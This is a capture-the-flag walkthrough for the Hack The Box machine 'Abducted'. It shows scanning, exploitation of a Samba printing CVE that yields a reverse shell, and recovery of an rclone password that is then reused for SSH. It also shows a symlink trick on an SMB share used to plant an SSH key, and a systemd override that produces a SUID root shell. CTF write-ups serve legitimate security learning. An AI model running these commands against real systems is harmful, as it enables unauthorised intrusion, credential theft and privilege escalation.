# Target
| Category          | Details                                                                        |
|-------------------|--------------------------------------------------------------------------------|
| 📝 **Name**       | [Abducted](https://app.hackthebox.com/machines/Abducted)                       |  
| 🏷 **Type**       | HTB Machine                                                                    |
| 🖥 **OS**         | Linux                                                                          |
| 🎯 **Difficulty** | Medium                                                                         |
| 📁 **Tags**       | [CVE-2026-4480](https://nvd.nist.gov/vuln/detail/CVE-2026-4480), rclone, Samba |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 15:21 +0200
Nmap scan report for 10.129.14.238
Host is up (0.028s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-09T13:21:48
|_  start_date: N/A
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.29 seconds
```

#### Discover writable printer share
```
┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ netexec smb $TARGET -u guest -p '' --shares
SMB         10.129.14.238   445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False)
SMB         10.129.14.238   445    ABDUCTED         [+] ABDUCTED\guest: (Guest)
SMB         10.129.14.238   445    ABDUCTED         [*] Enumerated shares
SMB         10.129.14.238   445    ABDUCTED         Share           Permissions     Remark
SMB         10.129.14.238   445    ABDUCTED         -----           -----------     ------
SMB         10.129.14.238   445    ABDUCTED         HP-Reception    WRITE           Reception printer
SMB         10.129.14.238   445    ABDUCTED         projects                        Hartley Group Project Files
SMB         10.129.14.238   445    ABDUCTED         transfer                        Staff file transfer
SMB         10.129.14.238   445    ABDUCTED         IPC$                            IPC Service (Hartley Group Document Services)

┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ enum4linux-ng -A $TARGET
<SNIP>
 ==========================================
|    Printers via RPC for 10.129.14.238    |
 ==========================================
[+] Found 1 printer(s):
\\10.129.14.238\:
  description: \\10.129.14.238\,,Reception printer                                 
  comment: Reception printer                                          
  flags: '0x800000'
```
There is known [CVE-2026-4480](https://nvd.nist.gov/vuln/detail/CVE-2026-4480) vulnerability in Samba printing subsystem.

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ nc -lvnp $LPORT
listening on [any] 4444 ...
```

#### Exploit [CVE-2026-4480](https://nvd.nist.gov/vuln/detail/CVE-2026-4480) to spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ git clone -q https://github.com/TheCyberGeek/CVE-2026-4480-PoC.git CVE-2026-4480 && \
python3 ./CVE-2026-4480/exploit.py -P 'HP-Reception' $TARGET $LHOST $LPORT
[*] target   : 10.129.14.238 (\\10.129.14.238\HP-Reception)
[*] callback : 10.10.14.69:4444  (start a listener first: nc -lvnp 4444)
[+] print job submitted -- check your listener / out-of-band channel
```

#### Confirm foothold gained
```
connect to [10.10.14.69] from (UNKNOWN) [10.129.14.238] 37252
bash: cannot set terminal process group (1707): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```
                           
#### Discover `rclone` password `/opt/offsite-backup/rclone.conf`
```
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf 
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

#### List user with shell access
```
nobody@abducted:/$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```
                                       
#### Reuse `iXzvcib3SrpZ` to access target over SSH as `scott` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ ssh scott@$TARGET                                
<SNIP>
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

#### Capture user flag
```
scott@abducted:~$ cat /home/scott/user.txt 
8da97cfad6b511b473505741a40de617
```

### Root flag

#### Discover `transfer` share misconfiguration
```
scott@abducted:~$ cat /etc/samba/shares.conf 
<SNIP>
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```
* `force user = marcus` - all file operations happen as user `marcus` regardless of who connects
* `wide links = yes` — symlink traversal allowed outside the share path

#### Use symlink attack to authorize SSH key for user `marcus` over SMB share
```
scott@abducted:~$ ln -s /home/marcus/ /srv/transfer/marcus
```

```
┌──(magicrc㉿perun)-[~/attack/HTB Abducted]
└─$ ssh-keygen -q -t rsa -b 1024 -f id_rsa -N "" -C "$RANDOM@$RANDOM.net" && \
cp id_rsa.pub authorized_keys && \
smbclient -U 'scott%iXzvcib3SrpZ' //$TARGET/transfer -c "cd marcus; mkdir .ssh; cd .ssh; put authorized_keys" && \
ssh -i id_rsa marcus@$TARGET
putting file authorized_keys as \marcus\.ssh\authorized_keys (2.3 kB/s) (average 2.3 kB/s)
<SNIP>
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

#### Discover write permissions to `/etc/systemd/system/smbd.service.d`
Write permission has been discovered with `linpeas`.
```
marcus@abducted:~$ ls -la /etc/systemd/system/ | grep smbd.service.d
drwxrws---  2 root operators 4096 Jun  4 13:41 smbd.service.d
```

#### Abuse `/etc/systemd/system/smbd.service.d` write permission to spawn root shell
```
marcus@abducted:~$ { cat > /etc/systemd/system/smbd.service.d/override.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'cp /bin/bash /tmp/root_shell && chmod +s /tmp/root_shell'
EOF
} && systemctl daemon-reload && systemctl restart smbd && sleep 2 && /tmp/root_shell -p
root_shell-5.2# id
uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root) groups=0(root),1000(operators),1002(marcus)  
```

#### Capture root flag
```
root_shell-5.2# cat /root/root.txt 
888a3ee74a2e70816539906333991c86
```
